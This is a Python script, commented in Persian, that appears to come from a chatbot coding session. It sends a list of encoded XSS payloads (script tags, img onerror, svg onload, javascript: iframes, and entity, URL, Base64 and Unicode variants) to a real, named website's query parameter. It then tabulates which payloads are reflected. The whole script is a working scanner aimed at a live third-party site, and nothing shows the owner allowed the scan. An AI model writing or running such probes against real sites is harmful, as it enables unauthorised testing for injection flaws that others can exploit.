from urllib.parse import quote
import requests

# لیست پیشرفته‌تر از payload های XSS با رمزگذاری مختلف
payloads = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML entities
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",            # URL encoded
    "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",           # Base64
    "\u003Cscript\u003Ealert(1)\u003C/script\u003E",  # Unicode escaped
]

base_url = "https://www.jadi.ir?input="
results = []

for payload in payloads:
    full_url = base_url + quote(payload)
    try:
        r = requests.get(full_url, timeout=5)
        reflected = payload in r.text or quote(payload) in r.text
        results.append({
            "Payload": payload,
            "Status": r.status_code,
            "Reflected": "✅" if reflected else "❌",
            "URL": full_url
        })
    except Exception as e:
        results.append({
            "Payload": payload,
            "Status": "Error",
            "Reflected": "⚠️",
            "URL": str(e)
        })

import pandas as pd
import ace_tools as tools

df = pd.DataFrame(results)
tools.display_dataframe_to_user(name="نتایج تست XSS پیشرفته", dataframe=df)
